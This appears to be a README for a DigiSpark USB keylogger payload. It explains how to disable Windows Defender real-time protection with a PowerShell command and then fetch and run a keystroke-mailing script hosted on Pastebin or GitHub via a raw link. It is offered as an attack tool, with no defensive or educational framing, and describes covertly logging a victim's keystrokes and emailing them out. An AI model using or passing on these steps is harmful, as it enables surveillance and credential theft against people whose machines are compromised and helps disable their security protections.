# DigiSpark-Keylogger-Payload

This Payload works in two steps which are as followes
1 - It disables the Real Time Protection of Windows Defender.
2 - It executes the keylogger Script. 

First step disableing the Real Time Protection of Windows Defender 
 The Powershel command line to disable Real Time Protection of Windows Defender is 
      "Set-MpPreference -DisableRealtimeMonitoring $true -V runAs"  # If powershell is not in Adminestrater mode
      
Second Step is to execute the keyStrockes Mailer script
 A link to the raw code of the script is required for this step, which can be obtained by uploading your script(After the chaning the Email Addresses and Password) in Paste bin(Unlisted mode) or Github etc and then you can copy the link form the raw format mode and use it in the provided Digispark_keylogger_payload.ino file.
 
I used Pastebin.com when I was testing this, just be carefull since your email and password could be seen by anyone who had the link to that Paste.
